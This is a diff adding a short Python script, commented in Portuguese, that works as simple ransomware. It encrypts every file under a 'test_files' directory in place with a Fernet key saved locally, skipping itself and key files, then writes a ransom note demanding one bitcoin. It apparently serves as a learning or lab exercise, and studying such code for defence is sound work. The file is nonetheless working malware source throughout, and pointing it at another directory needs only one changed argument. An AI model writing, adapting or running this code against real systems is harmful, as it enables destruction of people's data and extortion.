@@ -1,0 +1,50 @@
+from cryptography.fernet import Fernet
+import os
+
+# Gera uma chave de criptografia
+def gerar_chave():
+	chave = Fernet.generate_key() 
+	with open("chave.key", "wb") as chave_file:
+		chave_file.write(chave)
+
+# Carrega a chave salva
+def carregar_chave():
+	return open("chave.key", "rb").read()
+
+# Criptografa um único arquivo
+def criptografar_arquivo(arquivo, chave):
+	f = Fernet(chave)
+	with open(arquivo, "rb") as file:
+		dados = file.read()
+	dados_encriptados = f.encrypt(dados)
+	with open(arquivo, "wb") as file:
+		file.write(dados_encriptados)
+
+# Encontra arquivos para criptografar
+def encontrar_arquivo(diretorio):
+	lista = []
+	for raiz, _, arquivos in os.walk(diretorio):
+		for nome in arquivos:
+			caminho = os.path.join(raiz, nome)
+			if nome != "ransomware.py" and not nome.endswith(".key"):
+				lista.append(caminho)
+	return lista
+
+# Mensagem de resgate
+def criar_mensagem():
+	with open("LEIA ISSO.txt", "w") as f:
+		f.write("Seus arquivos foram criptografados.\n")
+		f.write("Envia 1 bitcoin para o endereço X e envie o comprovante.\n")
+
+def main():
+	gerar_chave()
+	chave = carregar_chave()
+	arquivos = encontrar_arquivo("test_files")
+	for arquivo in arquivos:
+		criptografar_arquivo(arquivo, chave)
+	criar_mensagem();
+	print("Ransomware executado.")
+	print("Arquivos criptografados.")
+
+if __name__ == "__main__":
+	main()
